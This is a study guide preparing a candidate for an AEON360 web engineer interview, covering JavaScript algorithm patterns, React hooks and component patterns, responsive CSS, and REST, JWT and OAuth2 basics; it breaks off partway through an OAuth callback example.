# AEON360 Web Engineer — Interview Prep Guide

**Role:** Web Engineer (Manager Grade) · AEON360 Sdn. Bhd.  
**Assessment platform:** Coderbyte  
**Stack focus:** React · TypeScript · REST APIs · CSS · Security · Performance

---

## How to use this guide

Work through the phases in order. Each phase is self-contained but builds on the last. Time estimates assume ~2–3 hours of focused study per day. Adjust if your interview is sooner.

**Phases at a glance:**

| Phase | Topic | Priority |
|---|---|---|
| 1 | JavaScript & TypeScript Core | Critical |
| 2 | React & Component Patterns | Critical |
| 3 | Responsive CSS & Layout | High |
| 4 | REST APIs, Auth & Security | High |
| 5 | Web Performance & Core Web Vitals | Medium |
| 6 | Testing | Medium |
| 7 | CI/CD & Git | Low (conceptual) |

---

## Phase 1 — JavaScript & TypeScript Core

**Why it's first:** Coderbyte algorithmic challenges run in vanilla JS/TS. Every other phase depends on solid JS fundamentals.

### 1.1 Must-know JavaScript

#### Array methods
```js
// Know these cold — they appear in almost every challenge
const nums = [1, 2, 3, 4, 5];

nums.filter(n => n % 2 === 0);      // [2, 4]
nums.map(n => n * 2);               // [2, 4, 6, 8, 10]
nums.reduce((acc, n) => acc + n, 0); // 15
nums.find(n => n > 3);              // 4
nums.some(n => n > 4);              // true
nums.every(n => n > 0);            // true
nums.flat();                        // flattens one level
nums.flatMap(n => [n, n * 2]);      // map + flatten in one pass
```

##### Deep dive: How `reduce` works internally

`reduce` is the most powerful array method — every other array method can be implemented with it.

```js
// Signature: arr.reduce(callback, initialValue)
// callback receives: (accumulator, currentValue, index, array)

// Example 1: Sum all numbers
const nums = [10, 20, 30];
const sum = nums.reduce((acc, n) => acc + n, 0);
// Step by step:
// acc=0,  n=10  → return 0 + 10 = 10
// acc=10, n=20  → return 10 + 20 = 30
// acc=30, n=30  → return 30 + 30 = 60
// Final: 60

// Example 2: Group objects by property
const users = [
  { name: 'Alice', role: 'admin' },
  { name: 'Bob', role: 'user' },
  { name: 'Charlie', role: 'admin' },
];

const grouped = users.reduce((acc, user) => {
  if (!acc[user.role]) acc[user.role] = [];
  acc[user.role].push(user);
  return acc;
}, {});
// Result: { admin: [Alice, Charlie], user: [Bob] }

// Example 3: Flatten nested arrays
const nested = [[1, 2], [3, 4], [5]];
const flat = nested.reduce((acc, arr) => acc.concat(arr), []);
// Result: [1, 2, 3, 4, 5]

// Example 4: Count frequency
const letters = ['a', 'b', 'a', 'c', 'b', 'a'];
const freq = letters.reduce((acc, letter) => {
  acc[letter] = (acc[letter] || 0) + 1;
  return acc;
}, {});
// Result: { a: 3, b: 2, c: 1 }
```

**Common use cases in interviews:**
- Summing, averaging, finding min/max
- Transforming arrays into objects (grouping, indexing by ID)
- Flattening nested structures
- Building complex data structures in one pass

#### Object manipulation
```js
const obj = { a: 1, b: 2, c: 3 };

Object.keys(obj);    // ['a', 'b', 'c']
Object.values(obj);  // [1, 2, 3]
Object.entries(obj); // [['a',1], ['b',2], ['c',3]]

// Spread to merge/override
const merged = { ...obj, d: 4, a: 99 }; // a is overridden

// Destructuring with defaults
const { a, b = 10, ...rest } = obj;
```

#### String methods to know
```js
str.includes('foo')
str.startsWith('bar')
str.split(',').join('-')
str.trim().toLowerCase()
str.replace(/\s+/g, '-')
str.padStart(5, '0')   // '00042'
```

#### Closures and scope

**Definition:** A closure is a function that remembers variables from its outer scope, even after that outer function has returned.

```js
// Classic closure trap — what does this log?
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // logs 3, 3, 3 — var is function-scoped
}

// Why? Because by the time the timeouts execute, the loop has finished and i = 3.
// All three callbacks reference the SAME variable i.

// Fix 1: Use let (block-scoped — creates a new binding each iteration)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // logs 0, 1, 2
}

// Fix 2: Create a new scope with IIFE (Immediately Invoked Function Expression)
for (var i = 0; i < 3; i++) {
  (function(captured) {
    setTimeout(() => console.log(captured), 0);
  })(i);
}
```

##### Practical closure use cases

```js
// Use case 1: Private variables (data encapsulation)
function createCounter() {
  let count = 0; // private — inaccessible from outside

  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count,
  };
}

const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
counter.getCount();  // 2
// counter.count is undefined — no direct access

// Use case 2: Function factories
function multiplyBy(factor) {
  return function(num) {
    return num * factor;
  };
}

const double = multiplyBy(2);
const triple = multiplyBy(3);
double(5); // 10
triple(5); // 15

// Use case 3: Event handlers that remember context
function setupButtons(items) {
  items.forEach(item => {
    const button = document.createElement('button');
    button.textContent = item.name;
    button.onclick = () => console.log(`Clicked ${item.name}`);
    // Closure captures the specific 'item' for this iteration
    document.body.appendChild(button);
  });
}
```

**Interview tip:** If asked to explain closures, use this format:
1. "A closure is a function that retains access to variables from its outer scope."
2. Give the counter example (shows private state).
3. Mention the `var` loop trap and how `let` fixes it.

#### Promises and async/await
```js
// Promise chaining
fetch('/api/users')
  .then(res => {
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  })
  .then(data => console.log(data))
  .catch(err => console.error(err));

// async/await equivalent (prefer this style)
async function getUsers() {
  try {
    const res = await fetch('/api/users');
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    return data;
  } catch (err) {
    console.error(err);
  }
}

// Parallel fetches — don't await sequentially when independent
const [users, products] = await Promise.all([
  fetch('/api/users').then(r => r.json()),
  fetch('/api/products').then(r => r.json()),
]);
```

#### Event loop — conceptual understanding

**The JavaScript runtime model:**
- **Call stack** executes synchronous code (LIFO — last in, first out).
- **Microtask queue** (Promises, `queueMicrotask`) drains *completely* before the next task.
- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs *one task at a time*.
- **Key rule:** All microtasks run before the next macrotask.

```js
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Output: 1, 4, 3, 2
```

##### Step-by-step execution trace

```js
console.log('A');                              // 1
setTimeout(() => console.log('B'), 0);         // 2
Promise.resolve().then(() => console.log('C')); // 3
Promise.resolve().then(() => console.log('D')); // 4
console.log('E');                              // 5

// Execution order:
// 
// [Call Stack]
// 1. console.log('A')  → logs 'A'
// 2. setTimeout(...)   → schedules 'B' in macrotask queue
// 3. Promise.then(...) → schedules 'C' in microtask queue
// 4. Promise.then(...) → schedules 'D' in microtask queue
// 5. console.log('E')  → logs 'E'
// 
// [Call stack now empty — check microtask queue]
// 6. console.log('C')  → logs 'C'
// 7. console.log('D')  → logs 'D'
// 
// [Microtask queue empty — check macrotask queue]
// 8. console.log('B')  → logs 'B'
//
// Final output: A, E, C, D, B
```

##### Common interview question: Nested promises vs setTimeout

```js
console.log('Start');

setTimeout(() => {
  console.log('Timeout 1');
  Promise.resolve().then(() => console.log('Promise in Timeout 1'));
}, 0);

Promise.resolve().then(() => {
  console.log('Promise 1');
  setTimeout(() => console.log('Timeout in Promise 1'), 0);
});

console.log('End');

// Output:
// Start
// End
// Promise 1                  ← microtask runs first
// Timeout 1                  ← then macrotask
// Promise in Timeout 1       ← microtask scheduled inside that macrotask runs immediately
// Timeout in Promise 1       ← macrotask scheduled inside microtask runs last
```

**Real-world implication:**
- Use `Promise.resolve().then(...)` to defer work but run before timers.
- Use `setTimeout(..., 0)` to defer work until after the current task + all microtasks.

### 1.3 Algorithmic patterns — with named problems

These patterns appear repeatedly in coding interviews. Master these and you can solve 80% of algorithm challenges.

#### Pattern 1: Two Pointers

**When to use:** Sorted arrays, finding pairs/triplets, in-place modifications.

```js
// Problem: Two Sum II (LeetCode #167) — array is sorted
// Find two numbers that add up to target
function twoSum(nums, target) {
  let left = 0, right = nums.length - 1;

  while (left < right) {
    const sum = nums[left] + nums[right];
    if (sum === target) return [left + 1, right + 1]; // 1-indexed
    if (sum < target) left++;   // need a larger sum
    else right--;               // need a smaller sum
  }
  return [];
}
// Time: O(n), Space: O(1)

// Problem: Remove Duplicates from Sorted Array (LeetCode #26)
function removeDuplicates(nums) {
  let writeIndex = 1; // where to write next unique element

  for (let readIndex = 1; readIndex < nums.length; readIndex++) {
    if (nums[readIndex] !== nums[readIndex - 1]) {
      nums[writeIndex] = nums[readIndex];
      writeIndex++;
    }
  }
  return writeIndex; // new length
}
// Time: O(n), Space: O(1)
```

#### Pattern 2: Sliding Window

**When to use:** Subarray/substring of specific length or condition, optimization problems.

```js
// Problem: Maximum Average Subarray I (LeetCode #643)
// Find contiguous subarray of length k with maximum average
function findMaxAverage(nums, k) {
  let sum = 0;
  for (let i = 0; i < k; i++) sum += nums[i]; // initial window

  let maxSum = sum;
  for (let i = k; i < nums.length; i++) {
    sum += nums[i] - nums[i - k]; // slide: add right, remove left
    maxSum = Math.max(maxSum, sum);
  }
  return maxSum / k;
}
// Time: O(n), Space: O(1)

// Problem: Longest Substring Without Repeating Characters (LeetCode #3)
function lengthOfLongestSubstring(s) {
  const seen = new Map(); // char → last seen index
  let left = 0, maxLen = 0;

  for (let right = 0; right < s.length; right++) {
    if (seen.has(s[right]) && seen.get(s[right]) >= left) {
      left = seen.get(s[right]) + 1; // move left past the duplicate
    }
    seen.set(s[right], right);
    maxLen = Math.max(maxLen, right - left + 1);
  }
  return maxLen;
}
// Time: O(n), Space: O(min(n, charset size))
```

#### Pattern 3: Hash Map / Frequency Counter

**When to use:** Counting, finding duplicates, anagrams, frequency-based problems.

```js
// Problem: First Unique Character (LeetCode #387)
function firstUniqChar(s) {
  const freq = {};
  for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
  for (let i = 0; i < s.length; i++) {
    if (freq[s[i]] === 1) return i;
  }
  return -1;
}
// Time: O(n), Space: O(1) — charset is constant (26 letters)

// Problem: Group Anagrams (LeetCode #49)
function groupAnagrams(strs) {
  const groups = {};
  for (const str of strs) {
    const key = str.split('').sort().join(''); // anagrams have same sorted key
    if (!groups[key]) groups[key] = [];
    groups[key].push(str);
  }
  return Object.values(groups);
}
// Time: O(n * k log k) where k is max string length
```

#### Pattern 4: Stack

**When to use:** Balanced brackets, next greater element, undo operations, parsing.

```js
// Problem: Valid Parentheses (LeetCode #20)
function isValid(s) {
  const stack = [];
  const pairs = { ')': '(', '}': '{', ']': '[' };

  for (const ch of s) {
    if (ch in pairs) {
      if (stack.pop() !== pairs[ch]) return false; // mismatch
    } else {
      stack.push(ch); // opening bracket
    }
  }
  return stack.length === 0; // all matched
}
// Time: O(n), Space: O(n)

// Problem: Daily Temperatures (LeetCode #739)
// For each day, how many days until a warmer temperature?
function dailyTemperatures(temps) {
  const result = new Array(temps.length).fill(0);
  const stack = []; // indices of days waiting for warmer temp

  for (let i = 0; i < temps.length; i++) {
    while (stack.length && temps[i] > temps[stack[stack.length - 1]]) {
      const prevDay = stack.pop();
      result[prevDay] = i - prevDay;
    }
    stack.push(i);
  }
  return result;
}
// Time: O(n), Space: O(n)
```

#### Pattern 5: Fast & Slow Pointers (Floyd's Cycle Detection)

**When to use:** Linked lists, cycle detection, finding middle element.

```js
// Problem: Linked List Cycle (LeetCode #141)
function hasCycle(head) {
  let slow = head, fast = head;

  while (fast && fast.next) {
    slow = slow.next;           // moves 1 step
    fast = fast.next.next;      // moves 2 steps
    if (slow === fast) return true; // they met — cycle exists
  }
  return false;
}
// Time: O(n), Space: O(1)

// Problem: Middle of Linked List (LeetCode #876)
function middleNode(head) {
  let slow = head, fast = head;
  while (fast && fast.next) {
    slow = slow.next;
    fast = fast.next.next;
  }
  return slow; // when fast reaches end, slow is at middle
}
```

#### Pattern 6: Binary Search

**When to use:** Sorted array, search space can be halved each iteration.

```js
// Problem: Binary Search (LeetCode #704)
function search(nums, target) {
  let left = 0, right = nums.length - 1;

  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (nums[mid] === target) return mid;
    if (nums[mid] < target) left = mid + 1;
    else right = mid - 1;
  }
  return -1;
}
// Time: O(log n), Space: O(1)

// Problem: First Bad Version (LeetCode #278)
function firstBadVersion(n) {
  let left = 1, right = n;
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    if (isBadVersion(mid)) right = mid; // answer is mid or earlier
    else left = mid + 1;
  }
  return left;
}
```

#### Pattern 7: Recursion & Backtracking

**When to use:** Tree traversal, combinatorial problems, generating permutations/subsets.

```js
// Problem: Generate Parentheses (LeetCode #22)
// Generate all valid combinations of n pairs of parentheses
function generateParenthesis(n) {
  const result = [];

  function backtrack(current, open, close) {
    if (current.length === 2 * n) {
      result.push(current);
      return;
    }
    if (open < n) backtrack(current + '(', open + 1, close);
    if (close < open) backtrack(current + ')', open, close + 1);
  }

  backtrack('', 0, 0);
  return result;
}
// Time: O(4^n / √n) — Catalan number, Space: O(n) for recursion stack

// Problem: Subsets (LeetCode #78)
function subsets(nums) {
  const result = [];

  function backtrack(start, current) {
    result.push([...current]);
    for (let i = start; i < nums.length; i++) {
      current.push(nums[i]);
      backtrack(i + 1, current);
      current.pop();
    }
  }

  backtrack(0, []);
  return result;
}
```

#### Pattern 8: Dynamic Programming (1D)

**When to use:** Optimization problems with overlapping subproblems (Fibonacci, climbing stairs, coin change).

```js
// Problem: Climbing Stairs (LeetCode #70)
// You can climb 1 or 2 steps at a time. How many ways to reach step n?
function climbStairs(n) {
  if (n <= 2) return n;
  let prev2 = 1, prev1 = 2;
  for (let i = 3; i <= n; i++) {
    const current = prev1 + prev2;
    prev2 = prev1;
    prev1 = current;
  }
  return prev1;
}
// Time: O(n), Space: O(1) — optimized from O(n) DP array

// Problem: House Robber (LeetCode #198)
// Can't rob adjacent houses. Maximize amount stolen.
function rob(nums) {
  let prev2 = 0, prev1 = 0;
  for (const num of nums) {
    const current = Math.max(prev1, prev2 + num); // skip or rob
    prev2 = prev1;
    prev1 = current;
  }
  return prev1;
}
// Time: O(n), Space: O(1)
```

**Pattern recognition cheat sheet:**

| If problem mentions... | Try this pattern |
|---|---|
| Sorted array + find pair/triplet | Two Pointers |
| Subarray/substring of length k | Sliding Window |
| Count frequencies, find duplicates | Hash Map |
| Balanced brackets, parsing, undo | Stack |
| Linked list cycle or middle | Fast & Slow Pointers |
| Sorted + search | Binary Search |
| Generate all combinations | Recursion + Backtracking |
| "What's the maximum/minimum ways to..." | Dynamic Programming |

### 1.4 References
- [javascript.info](https://javascript.info) — read: Data types, Functions, Promises, Async/await, Classes
- [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html) — read: Everyday Types, Generics, Utility Types

### 1.5 Practice platforms

| Platform | Best for | Difficulty | Free tier |
|---|---|---|---|
| **LeetCode** | Algorithmic problems, patterns | Easy → Hard | Yes (most problems) |
| **HackerRank** | Interview prep tracks, certificates | Easy → Medium | Yes |
| **Coderbyte** | AEON360 uses this — practice here first | Easy → Hard | Limited free challenges |
| **Frontend Mentor** | Real UI challenges (HTML/CSS/JS/React) | Junior → Advanced | Yes |
| **StackBlitz / CodeSandbox** | Quick React/TS prototyping | N/A | Yes |

**Recommendation:** Start with 10–15 LeetCode Easy problems covering the 8 patterns above, then move to Medium problems. If the interview platform is confirmed as Coderbyte, spend your last 3 days there to get familiar with the editor and submission flow.

---

## Phase 2 — React & Component Patterns

**Why it matters:** The JD explicitly names React. Coderbyte frontend challenges frequently ask you to build or fix a React component.

### 2.1 Hooks reference

#### useState
```jsx
const [count, setCount] = useState(0);

// Functional update — use when new state depends on old state
setCount(prev => prev + 1);

// Lazy initial state — runs once, not on every render
const [data, setData] = useState(() => JSON.parse(localStorage.getItem('data') ?? '[]'));
```

#### useEffect
```jsx
// Runs after every render — rarely what you want
useEffect(() => { ... });

// Runs once on mount (empty dependency array)
useEffect(() => { ... }, []);

// Runs when dependency changes
useEffect(() => {
  const controller = new AbortController();

  fetch(`/api/users/${id}`, { signal: controller.signal })
    .then(r => r.json())
    .then(setUser)
    .catch(err => {
      if (err.name !== 'AbortError') setError(err.message);
    });

  // Cleanup — cancels the request if component unmounts or id changes
  return () => controller.abort();
}, [id]);
```

#### useRef
```jsx
// Two uses: DOM reference and mutable value that doesn't trigger re-render
const inputRef = useRef<HTMLInputElement>(null);

// Access DOM
inputRef.current?.focus();

// Store a value without re-rendering
const intervalId = useRef<number | null>(null);
intervalId.current = setInterval(() => ..., 1000);
```

#### useCallback and useMemo
```jsx
// useCallback — memoize a function reference (use when passing to child components or deps arrays)
const handleSubmit = useCallback((e: React.FormEvent) => {
  e.preventDefault();
  // ...
}, [dependency]);

// useMemo — memoize an expensive computation
const sortedUsers = useMemo(
  () => [...users].sort((a, b) => a.name.localeCompare(b.name)),
  [users]
);
```

> **Common mistake:** Overusing `useCallback`/`useMemo`. Only add them when you can measure a performance problem, or when a function is a dependency in another hook.

#### useReducer
```jsx
type Action =
  | { type: 'increment' }
  | { type: 'decrement' }
  | { type: 'reset'; payload: number };

function reducer(state: number, action: Action): number {
  switch (action.type) {
    case 'increment': return state + 1;
    case 'decrement': return state - 1;
    case 'reset': return action.payload;
    default: return state;
  }
}

const [count, dispatch] = useReducer(reducer, 0);
dispatch({ type: 'increment' });
dispatch({ type: 'reset', payload: 10 });
```

#### useContext
```tsx
interface ThemeContextType {
  theme: 'light' | 'dark';
  toggle: () => void;
}

const ThemeContext = createContext<ThemeContextType | null>(null);

function ThemeProvider({ children }: { children: React.ReactNode }) {
  const [theme, setTheme] = useState<'light' | 'dark'>('light');
  const toggle = useCallback(() => setTheme(t => t === 'light' ? 'dark' : 'light'), []);
  return <ThemeContext.Provider value={{ theme, toggle }}>{children}</ThemeContext.Provider>;
}

// Custom hook to consume context safely
function useTheme() {
  const ctx = useContext(ThemeContext);
  if (!ctx) throw new Error('useTheme must be used within ThemeProvider');
  return ctx;
}
```

### 2.2 Custom hooks pattern

```tsx
// Reusable fetch hook — extracting async logic out of components
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const controller = new AbortController();
    setLoading(true);

    fetch(url, { signal: controller.signal })
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json() as Promise<T>;
      })
      .then(data => { setData(data); setLoading(false); })
      .catch(err => {
        if (err.name !== 'AbortError') {
          setError(err.message);
          setLoading(false);
        }
      });

    return () => controller.abort();
  }, [url]);

  return { data, loading, error };
}

// Usage
function UserList() {
  const { data, loading, error } = useFetch<User[]>('/api/users');

  if (loading) return <p>Loading...</p>;
  if (error) return <p>Error: {error}</p>;
  return <ul>{data?.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}
```

### 2.3 Component patterns

#### Controlled form
```tsx
function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});

  function validate() {
    const errs: typeof errors = {};
    if (!email.includes('@')) errs.email = 'Enter a valid email';
    if (password.length < 8) errs.password = 'Minimum 8 characters';
    return errs;
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length) { setErrors(errs); return; }
    // submit...
  }

  return (
    <form onSubmit={handleSubmit}>
      <label htmlFor="email">Email</label>
      <input
        id="email"
        type="email"
        value={email}
        onChange={e => setEmail(e.target.value)}
      />
      {errors.email && <span role="alert">{errors.email}</span>}

      <label htmlFor="password">Password</label>
      <input
        id="password"
        type="password"
        value={password}
        onChange={e => setPassword(e.target.value)}
      />
      {errors.password && <span role="alert">{errors.password}</span>}

      <button type="submit">Log in</button>
    </form>
  );
}
```

#### Error boundary
```tsx
class ErrorBoundary extends React.Component<
  { children: React.ReactNode; fallback: React.ReactNode },
  { hasError: boolean }
> {
  state = { hasError: false };

  static getDerivedStateFromError() {
    return { hasError: true };
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    console.error('Boundary caught:', error, info);
  }

  render() {
    if (this.state.hasError) return this.props.fallback;
    return this.props.children;
  }
}
```

#### Optimistic UI updates

**Pattern:** Update UI immediately, then sync with server. If server fails, roll back.

```tsx
function TodoList() {
  const [todos, setTodos] = useState<Todo[]>([]);

  async function toggleTodo(id: number) {
    // 1. Optimistic update — instant feedback
    setTodos(prev => prev.map(todo =>
      todo.id === id ? { ...todo, completed: !todo.completed } : todo
    ));

    // 2. Sync with server
    try {
      await fetch(`/api/todos/${id}/toggle`, { method: 'PATCH' });
    } catch (err) {
      // 3. Rollback on failure
      setTodos(prev => prev.map(todo =>
        todo.id === id ? { ...todo, completed: !todo.completed } : todo
      ));
      alert('Failed to update todo');
    }
  }

  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          <input
            type="checkbox"
            checked={todo.completed}
            onChange={() => toggleTodo(todo.id)}
          />
          {todo.title}
        </li>
      ))}
    </ul>
  );
}
```

**Real-world use:** Chat apps, e-commerce carts, social media likes — anywhere instant feedback is critical.

#### Compound components pattern

**Pattern:** Components that work together, sharing implicit state without prop drilling.

```tsx
// API Design: <Select> and <Select.Option> share state implicitly
interface SelectContextType {
  value: string;
  onChange: (value: string) => void;
}

const SelectContext = createContext<SelectContextType | null>(null);

function Select({ value, onChange, children }: {
  value: string;
  onChange: (value: string) => void;
  children: React.ReactNode;
}) {
  return (
    <SelectContext.Provider value={{ value, onChange }}>
      <div className="select">{children}</div>
    </SelectContext.Provider>
  );
}

function Option({ value, children }: { value: string; children: React.ReactNode }) {
  const ctx = useContext(SelectContext);
  if (!ctx) throw new Error('Option must be used inside Select');

  return (
    <button
      className={ctx.value === value ? 'active' : ''}
      onClick={() => ctx.onChange(value)}
    >
      {children}
    </button>
  );
}

Select.Option = Option;

// Usage — clean API, no prop drilling
function App() {
  const [color, setColor] = useState('red');
  return (
    <Select value={color} onChange={setColor}>
      <Select.Option value="red">Red</Select.Option>
      <Select.Option value="blue">Blue</Select.Option>
      <Select.Option value="green">Green</Select.Option>
    </Select>
  );
}
```

**Real-world use:** Tabs, Accordions, Dropdown menus — anywhere child components need shared state.

#### Render props pattern

**Pattern:** Pass a function as `children` to control rendering from the parent.

```tsx
// Reusable mouse tracker
function MouseTracker({ render }: { render: (pos: { x: number; y: number }) => React.ReactNode }) {
  const [pos, setPos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    const handleMove = (e: MouseEvent) => setPos({ x: e.clientX, y: e.clientY });
    window.addEventListener('mousemove', handleMove);
    return () => window.removeEventListener('mousemove', handleMove);
  }, []);

  return <>{render(pos)}</>;
}

// Usage — parent controls what to render
function App() {
  return (
    <MouseTracker
      render={({ x, y }) => (
        <div style={{ position: 'fixed', left: x, top: y, pointerEvents: 'none' }}>
          🎯 ({x}, {y})
        </div>
      )}
    />
  );
}
```

**Real-world use:** Custom hooks have largely replaced this pattern, but it's still common in libraries (React Router's `<Route render={...} />`).

#### Data fetching strategies

```tsx
// Strategy 1: Fetch on mount (simplest)
function UserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then(r => r.json())
      .then(data => { setUser(data); setLoading(false); });
  }, [userId]);

  if (loading) return <p>Loading...</p>;
  return <div>{user.name}</div>;
}

// Strategy 2: Parallel fetching (Promise.all)
function Dashboard() {
  const [data, setData] = useState({ users: [], products: [], stats: {} });

  useEffect(() => {
    Promise.all([
      fetch('/api/users').then(r => r.json()),
      fetch('/api/products').then(r => r.json()),
      fetch('/api/stats').then(r => r.json()),
    ]).then(([users, products, stats]) => {
      setData({ users, products, stats });
    });
  }, []);

  return <div>{/* render data */}</div>;
}

// Strategy 3: Sequential with dependency (waterfall — avoid if possible)
function PostWithComments({ postId }: { postId: number }) {
  const [post, setPost] = useState(null);
  const [comments, setComments] = useState([]);

  useEffect(() => {
    fetch(`/api/posts/${postId}`)
      .then(r => r.json())
      .then(setPost);
  }, [postId]);

  useEffect(() => {
    if (!post) return; // wait for post to load first
    fetch(`/api/posts/${postId}/comments`)
      .then(r => r.json())
      .then(setComments);
  }, [postId, post]);

  // Better: fetch both in parallel if postId is enough
}

// Strategy 4: Debounced search (avoid API spam)
function SearchUsers() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);

  useEffect(() => {
    if (!query) { setResults([]); return; }

    const timer = setTimeout(() => {
      fetch(`/api/users/search?q=${encodeURIComponent(query)}`)
        .then(r => r.json())
        .then(setResults);
    }, 300); // wait 300ms after user stops typing

    return () => clearTimeout(timer);
  }, [query]);

  return (
    <div>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <ul>{results.map(u => <li key={u.id}>{u.name}</li>)}</ul>
    </div>
  );
}
```

### 2.4 What to be able to build in 30 minutes on Coderbyte

- A filterable/searchable list that fetches from a REST endpoint
- A multi-step form with validation
- A tab or accordion component with accessible keyboard nav
- An infinite scroll or paginated list

### 2.5 References
- [react.dev](https://react.dev) — "Describing the UI" and "Managing State" sections
- [ui.dev React hooks](https://ui.dev/react-hooks) — visual hook lifecycle explanations

---

## Phase 3 — Responsive CSS & Layout

### 3.1 Flexbox cheat sheet

```css
/* Container */
display: flex;
flex-direction: row | column;
justify-content: flex-start | center | flex-end | space-between | space-around | space-evenly;
align-items: stretch | flex-start | center | flex-end | baseline;
flex-wrap: nowrap | wrap;
gap: 1rem;

/* Item */
flex: 1;          /* grow and shrink equally */
flex: 0 0 200px;  /* fixed width, no grow/shrink */
align-self: flex-start; /* override align-items for one item */
order: 2;         /* reorder visually without DOM change */
```

#### Common pattern: sticky footer
```css
body {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}
main { flex: 1; }
```

### 3.2 CSS Grid cheat sheet

```css
/* Container */
display: grid;
grid-template-columns: repeat(3, 1fr);      /* 3 equal columns */
grid-template-columns: 2fr 1fr;             /* 2:1 ratio */
grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* responsive without media queries */
gap: 1.5rem;
grid-template-areas:
  "header header"
  "sidebar main"
  "footer footer";

/* Item */
grid-column: 1 / 3;       /* span 2 columns */
grid-row: 1 / span 2;     /* span 2 rows */
grid-area: header;         /* named area placement */
```

### 3.3 Responsive breakpoints (mobile-first)

```css
/* Base styles target mobile */
.container { padding: 1rem; }

/* Tablet */
@media (min-width: 768px) {
  .container { padding: 2rem; }
}

/* Desktop */
@media (min-width: 1024px) {
  .container { padding: 3rem; max-width: 1200px; margin: 0 auto; }
}
```

#### Tailwind equivalents
```html
<!-- Mobile first, responsive prefix for larger screens -->
<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8">
```

### 3.4 Fluid sizing without media queries

```css
/* clamp(min, preferred, max) */
font-size: clamp(1rem, 2.5vw, 1.5rem);
padding: clamp(1rem, 5vw, 3rem);
```

### 3.5 References
- [CSS Tricks Flexbox Guide](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
- [CSS Tricks Grid Guide](https://css-tricks.com/snippets/css/complete-guide-grid/)
- [Tailwind CSS Docs](https://tailwindcss.com/docs/utility-first)

---

## Phase 4 — REST APIs, Auth & Security

### 4.1 REST API consumption patterns

```ts
// Base fetch wrapper with error handling
async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
  const res = await fetch(url, {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${getToken()}`,
    },
    ...options,
  });

  if (!res.ok) {
    const body = await res.json().catch(() => ({}));
    throw new Error(body.message ?? `HTTP ${res.status}`);
  }

  return res.json() as Promise<T>;
}

// POST with body
await apiFetch<User>('/api/users', {
  method: 'POST',
  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
});
```

### 4.2 JWT — structure and storage

**Structure:** `header.payload.signature`

- **Header:** algorithm + token type (`{"alg":"HS256","typ":"JWT"}`)
- **Payload:** claims — `sub` (user id), `exp` (expiry), `iat` (issued at), custom fields
- **Signature:** HMAC of header + payload using a secret key

#### Storage tradeoffs

| Location | XSS Risk | CSRF Risk | Notes |
|---|---|---|---|
| `localStorage` | High | None | JS can read it — avoid for sensitive tokens |
| `sessionStorage` | High | None | Cleared on tab close, still readable by JS |
| `httpOnly` cookie | None | Moderate | Cannot be read by JS — safest option |
| `httpOnly` cookie + `SameSite=Strict` | None | None | Best practice |

```ts
// Reading a JWT payload (client-side, no library needed)
function parseJwt(token: string) {
  const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
  return JSON.parse(window.atob(base64));
}
```

### 4.3 OAuth2 — Authorization Code Flow

**Overview:** OAuth2 lets users grant your app access to their data on another service (Google, GitHub, etc.) without sharing their password.

#### Step-by-step flow with code

```
1. User clicks "Log in with Google"
2. App redirects to: https://accounts.google.com/o/oauth2/auth?
     client_id=YOUR_CLIENT_ID
     &redirect_uri=https://yourapp.com/callback
     &response_type=code
     &scope=openid email profile
     &state=RANDOM_STRING  ← prevents CSRF
3. User authenticates and consents
4. Google redirects back to: https://yourapp.com/callback?code=AUTH_CODE&state=RANDOM_STRING
5. App server exchanges code for tokens (POST to token endpoint)
   — This happens server-side to keep client_secret private
6. Server stores access_token and refresh_token securely
7. App receives a session cookie (not the raw token)
```

##### Frontend: Initiating the flow

```tsx
// Login button component
function GoogleLogin() {
  function handleLogin() {
    const state = crypto.randomUUID(); // CSRF protection
    sessionStorage.setItem('oauth_state', state);

    const params = new URLSearchParams({
      client_id: 'YOUR_CLIENT_ID',
      redirect_uri: 'https://yourapp.com/callback',
      response_type: 'code',
      scope: 'openid email profile',
      state,
    });

    window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;
  }

  return <button onClick={handleLogin}>Log in with Google</button>;
}
```

##### Backend: Handling the callback (Node.js/Express example)

```ts
// GET /callback?code=...&state=...
app.get('/callback', async (req, res) => {
  const { code, state } = req.query;

  // 1. Validate state to prevent CSRF
  const savedState = req.session.oauth_state;
  if (!state || state !== savedState) {
    return res.status(400).send('Invalid state parameter');
  }

  // 2. Exchange code for tokens
